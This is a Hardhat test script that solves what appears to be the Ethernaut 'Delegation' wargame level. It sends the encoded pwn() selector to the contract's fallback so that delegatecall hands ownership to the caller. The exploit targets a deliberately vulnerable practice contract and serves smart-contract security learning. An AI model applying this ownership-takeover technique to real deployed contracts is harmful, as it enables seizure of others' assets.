import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, Contract } from "ethers";
import { Interface } from "ethers/lib/utils";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x9451961b7Aea1Df57bc20CC68D72f662241b5493";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe.only("Delegation", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const delegationContractFactory = await ethers.getContractFactory("Delegation");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await delegationContractFactory.attach(challengeAddr);
    });

    it("Should solve the challenge", async function () {
        
        expect(await submitInstance(contract.address)).to.be.false;

        const iAbi: Interface = new ethers.utils.Interface(["function pwn()"]);
        const encodedData: string = iAbi.encodeFunctionData("pwn");

        // sends the pwn() method id as msg.data to the fallback of Delegation contract
        // which then in turn delegatecalls the Delegate contract and claims ownership
        const delegateFallbackTxn: any = {
            to: contract.address,
            data: encodedData,
            gasLimit: BigNumber.from("50000")
        };
        txn = await owner.sendTransaction(delegateFallbackTxn);
        await txn.wait();

        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});